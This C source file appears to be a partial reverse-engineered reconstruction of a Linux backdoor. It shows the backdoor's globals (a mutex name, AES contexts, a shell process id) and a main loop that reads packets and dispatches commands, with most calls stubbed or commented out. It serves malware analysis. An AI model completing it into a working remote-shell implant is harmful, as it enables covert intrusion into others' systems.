#pragma once

#include <unistd.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/select.h>
#include <sys/time.h>

// .data segment
uint32_t AuthenticatedSocket = -1; // prob set to -1
char *MutexName = "n|,Év-";

// .bss segment
char *DecryptionContext;
char *EncryptionContext;
char *InitializationVector;
FILE *TransferList[255];

pid_t SearchPId;
pid_t ShellPId;


#include "functions.h"

int main (int argc, char **argv, char **envp) {

	char * var_c26;
	char * filename;
	int fd;
	int buf;

	// Value used to ease decompilation
	int ret;

	InitAESTables();

	// InitTransfersList();

	// ReadSettings();

	InstallHost();

	while (1) {

		if (ReadPacket(fd , buf, 4) == 4) {

			// CloseSocket(fd);

			TerminateRunningOperations();

			// EstablishConnectionLoop();

			// If the returned value is not 0 or 4294967295 then we can go back
			// to the read packet part
			// SendAuthenticationPacket();

		} else {
			// If a packet is successfully read
			
			if (IsDataSizeAllowed(fd, buf) !=  0) {

				// From the disassembly I actually don't know how many bytes are
				// read, but I can safely assume at most `sizeof(buf)' bytes are
				// read
				ret = ReadPacket(fd, buf, sizeof(buf));

				if (ret > 0) {
					if (ret < 3037) {
						var_c26 = 0;
					}

					// ret = IsCommandAllowed(fd, var_c26, ret, ret);

					if (ret != 0) {
						// Here we go down the rabbit hole
						// ProcessData(arg, int, filename, int);
					} else {
						// leave
						cpSleep(10000);
						// CloseSocket(fd);
					}
				}
			}
		}
	}
}





